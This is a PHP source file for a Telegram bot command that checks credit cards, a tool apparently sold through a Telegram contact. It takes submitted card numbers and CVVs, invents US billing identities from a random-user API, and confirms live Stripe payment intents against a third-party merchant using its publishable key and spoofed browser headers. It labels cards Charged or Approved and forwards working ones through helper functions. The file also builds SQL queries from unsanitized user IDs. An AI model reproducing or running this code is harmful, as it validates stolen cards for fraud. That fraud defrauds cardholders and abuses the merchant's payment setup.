<?php
if(strpos($message, '!ch') === 0 or strpos($message, '/ch') === 0 or strpos($message, '.ch') === 0){
// if ($gId != '1317173146'){
// reply_to($chatId,$message_id,$keyboard,$maintain);
// exit();
// }
    $keyboard = [
    'inline_keyboard' => [[['text' => 'Features', 'callback_data' => 'paid'], ['text' => 'Buy', 'callback_data' => 'buy'], ['text' => 'Buy Now', 'url' => 'https://t.me/r0ld3x'],]]];
$keyboard = json_encode($keyboard);
checkrole($chatId,$message_id,$keyboard,$nopre,$gId);
$starttime = microtime(true);
$flag = 'getFlags';
$mytime = 'time1';

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "SELECT time FROM persons WHERE userid='$gId'";
    $result20 = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result20)) {
    $json_array[] = $row;
    }
    $final20 = json_encode($json_array);
    $times = trim(strip_tags(getStr($final20, '"time":"','"')));
mysqli_close($link);

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "SELECT role FROM persons WHERE userid='$gId'";
    $result20 = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result20)) {
      $json_array[] = $row;
    }
    $final201 = json_encode($json_array);
    $role = trim(strip_tags(getStr($final201, '"role":"','"')));
mysqli_close($link);
$current = time();
$sec = $current - $times;
if($role == 'MEMBER' and $sec < 20)
{
 $after = 20 - $sec;
  $antispam = urlencode ("<b>[ANTISPAM] <i> TRY AGAIN AFTER $after sec.</i></b>");
reply_to($chatId,$message_id,$keyboard,$antispam);
 exit();
}elseif($role == 'USER' and $sec < 120)
{
 $after = 120 - $sec;
  $antispam = urlencode ("<b>[ANTISPAM] <i> TRY AGAIN AFTER $after sec.</i></b>");
reply_to($chatId,$message_id,$keyboard,$antispam);
 exit();
}elseif(empty($role)){
 reply_to($chatId,$message_id,$keyboard,$noregister);
 exit();
}
sendaction($chatId, typing);
$lista = substr($message, 4);
$lista = clean($lista);
$check = strlen($lista);
$chem = substr($lista, 0,1);
$cc = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "/", " ", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "/", " ", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "/", " ", "|", ""), $lista)[3];
$strlenn = strlen($cc);
$strlen1 = strlen($mes);
$ano1 = $ano;
$list = ''.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'';
$vaut = array(1,2,7,8,9,0);
if (in_array($chem, $vaut)) { 
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
  } 
if (empty($cvv)){
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
 }
if (empty($lista)){
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
}elseif($check<15){
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
}elseif(strlen($strlenn != 16)){
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
}
if(strlen($strlen1 > 2)) {
$ano = $cvv; 
$cvv = $mes;
$mes = $ano1;}
$sss = reply_to($chatId,$message_id,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> □□□□□ 0%[🟥] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");
$respon = json_decode($sss, TRUE);
$message_id_1 = $respon['result']['message_id'];
///////////////////////////////////////////////////////////////////////////////////////////////////////////////
sendaction($chatId, typing);
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=US');
    preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
    $first = $matches1[1][0];
    preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
    $last = $matches1[1][0];
    preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
    $email = $matches1[1][0];
    preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
    $street = $matches1[1][0];
    preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
    $city = $matches1[1][0];
    preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
    $state = $matches1[1][0];
    $state1 = $matches1[1][0];
    preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
    $phone = $matches1[1][0];
    preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
    $zip = $matches1[1][0];
    preg_match_all("(\"username\":\"(.*)\")siU", $get, $matches1);
    $usrnme = $matches1[1][0];
    preg_match_all("(\"password\":\"(.*)\")siU", $get, $matches1);
    $pass = $matches1[1][0];
    preg_match_all("(\"salt\":\"(.*)\")siU", $get, $matches1);
    $salt = $matches1[1][0];
    $pwd = ''.$pass.''.$salt.'';
    preg_match_all("(\"nat\":\"(.*)\")siU", $get, $matches1);
    $con = $matches1[1][0];
    $numero1 = substr($phone, 1,3);
    $numero2 = substr($phone, 6,3);
    $numero3 = substr($phone, 10,4);
    $phone = $numero1.''.$numero2.''.$numero3;
    $serve_arr = array("gmail.com","hotmail.com","yahoo.com","yopmail.com","outlook.com");
    $serv_rnd = $serve_arr[array_rand($serve_arr)];
    $email = str_replace("example.com", $serv_rnd, $email);
    $state = state($state);
$bin = substr($cc,0,6);
    $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$roldex = $fim['bank']['name'];
$bincap2 = $fim['country']['alpha2'];
$bincap4 = $fim['type'];
$bincap3 = $fim['scheme'];
$bincap5 = $fim['brand'];
$che = bannedbin($bin);
if(strpos($fim, '"type":"credit"') !== false) {
  $type = 'Credit';
} else {
  $type = 'Debit';
}
curl_close($ch);
    if(!isset($fim) or $che == true) {
    edit_message($chatId,$message_id_1,$keyboard, "<b>❌BIN BANNED</b>");
    exit();
    }
    // 
    // $ip = array(
  // 1 => 'socks5://p.webshare.io:1080',
  // 2 => 'http://p.webshare.io:80',
    // );
    // $socks = array_rand($ip);
    // $socks5 = $ip[$socks];

edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■□□□ 40%[🟧] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.only.one/api/v1/stripe/payment_intent');
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: api.only.one',
    'content-type: application/json',
    'origin: https://only.one',
    'sec-fetch-site: same-site',
    'sec-fetch-mode: cors',
    'sec-fetch-dest: empty',
    'referer: https://only.one/',
    'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
    "user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''))",
    ));
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{"customer":{"first_name":"'.$first.'","last_name":"'.$last.'","email":"'.$email.'"},"value":50000,"currency":"INR","metadata":{}}');
    $result = curl_exec($ch);
    $cap1 = json_decode($result, true);
curl_close($ch);

//////////////////////////////////////////////////////////////////////////////////////////////////////////////
edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■■□□ 60%[🟨] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");
if (strpos($result, '"payment_intent"')){
    $cap1 = json_decode($result, true);
    $id1 = $cap1['data']['attributes']['client_secret'];
    $id2 = $cap1['data']['id'];
$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/'.$id2.'/confirm');
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'accept: application/json',
    'accept-language: es-ES,es;q=0.9',
    'content-type: application/x-www-form-urlencoded',
    'origin: https://js.stripe.com',
    'referer: https://js.stripe.com/',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    "user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''))",
    ));
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&payment_method_data[billing_details][name]='.$first.'+'.$last.'&payment_method_data[billing_details][email]='.$email.'&payment_method_data[billing_details][address][line1]=3+Allen+Street&payment_method_data[billing_details][address][city]=New+York&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][postal_code]=10002&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[guid]=fa60e86c-4e97-4227-97e1-12ce550ac8b422e117&payment_method_data[muid]=d22d9979-b44d-421b-b60f-85d3f90fb3ae40ec39&payment_method_data[sid]=cab480d3-b48d-4c04-bbeb-cd160e4a8eb96eea27&payment_method_data[payment_user_agent]=stripe.js%2F2c04e5ffb%3B+stripe-js-v3%2F2c04e5ffb&payment_method_data[time_on_page]=64971&payment_method_data[referrer]=https%3A%2F%2Fonly.one%2F&expected_payment_method_type=card&use_stripe_sdk=true&webauthn_uvpa_available=true&spc_eligible=false&key=pk_live_WGPbgfMspKkssN3TCXlbtQbF&client_secret='.$id1.'');
$result = curl_exec($ch);
    $cap1 = json_decode($result, true);
    $ccc = preg_replace('/_/', ' ', ucfirst($cap1["error"]['decline_code']));
    $code = preg_replace('/_/', ' ', ucfirst($cap1["error"]['code']));
    $res = $cap1["error"]['message'];
curl_close($ch);
}

edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■■■■ 100%[🟩] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
if (strpos($result, 'state": "succeeded')){
  $status = 'succeeded✅';
  $cc_code = "Charged";
  cvv($list);
  sendMessage1($list);
}elseif (strpos($result, 'status": "succeeded')) {
  $status = 'succeeded✅';
  $cc_code = "Charged";
  cvv($list);
  sendMessage1($list);
}elseif (strpos($result, 'succeeded')) {
  $status = 'succeeded✅';
  $cc_code = "Charged";
  cvv($list);
  sendMessage1($list);
}elseif (strpos($result, 'requires_action')) {
  $status = 'Approved✅';
  $cc_code = "3D SECURE";
  cvv($list);
  sendMessage1($list);
}elseif (strpos($result, 'redirect_to_url')) {
  $status = 'Approved✅';
  $cc_code = "3D SECURE";
  cvv($list);
}elseif (strpos($result, 'requires_payment_method')) {
  $status = 'Approved✅';
  $cc_code = "3D SECURE";
  cvv($list);
}elseif (strpos($result, 'authentication')) {
  $status = 'Approved✅';
  $cc_code = "3D SECURE";
  cvv($list);
}elseif (strpos($result, '"cvc_check": "pass"')) {
  $status = 'Approved✅';
  $cc_code = 'CVC PASS';
  rest($list);
  sendMessage1($list);
}elseif (strpos($result1, '"cvc_check": "pass"')) {
  $status = 'Approved✅';
  $cc_code = 'CVV PASS';
  cvv($list);
  sendMessage1($list);
}elseif (strpos($result, 'insufficient funds')){
  $status = 'Succeeded✅';
  $cc_code = "Insufficient Funds";
  cvv($list);
  sendMessage1($list);
}elseif (strpos($result, 'security code is incorrect')){
  $status = 'Succeeded✅';
  $cc_code = "Security code is incorrect";
  ccn($list);
}
if(empty($ccc) and !empty($res)){
    $ccc = 'Card declined';
}
if(!empty($ccc)){
    $status = $ccc;
}if(!empty($res)){
    $cc_code = $res;
}if(!empty($code)){
    $code = $code;
}elseif(empty($code)){
    $code = 'none';
}

if(empty($result) or empty($code)){
sendMessage1($result);
$result = urlencode("<b>
GATE --> <i>STRIPE - CHARGE 3USD</i>
CC ->> <code>$cc|$mes|$ano|$cvv|@RoldexVerse</code>
Result ->> Unknown error
Message ->> Check again
Bin Info ->> $bincap4-$bincap3-$bincap5
Bank Info ->> $roldex-$bincap2-{$flag($bincap2)}
Time ->> {$mytime($starttime)}s
Checked By ->> <a href='tg://user?id=$gId'>@${username}</a>[<i>$role</i>]
Bot By --> <code>@r0ld3x</code></b>");
sendMessage1($list);
edit_message($chatId,$message_id_1,$keyboard, $result);
    $timest = time();

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "UPDATE persons SET time = '$timest' WHERE persons.userid='$gId'";
    $result21 = mysqli_query($link, $sql);
mysqli_close($link);
exit();
}
$result = urlencode("<b>
GATE --> <i>STRIPE - CHARGE 3USD</i>
CC ->> <code>$cc|$mes|$ano|$cvv|@RoldexVerse</code>
Code ->> $code
Result ->> $status
Message ->> $cc_code
Bin Info ->> $bincap4-$bincap3-$bincap5
Bank Info ->> $roldex-$bincap2-{$flag($bincap2)}
Time ->> {$mytime($starttime)}s
Checked By ->> <a href='tg://user?id=$gId'>@${username}</a>[<i>$role</i>]
Bot By --> <code>@r0ld3x</code></b>");
edit_message($chatId,$message_id_1,$keyboard, $result);
    rest($list);
    $timest = time();

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "UPDATE persons SET time = '$timest' WHERE persons.userid='$gId'";
    $result21 = mysqli_query($link, $sql);
mysqli_close($link);
}
?>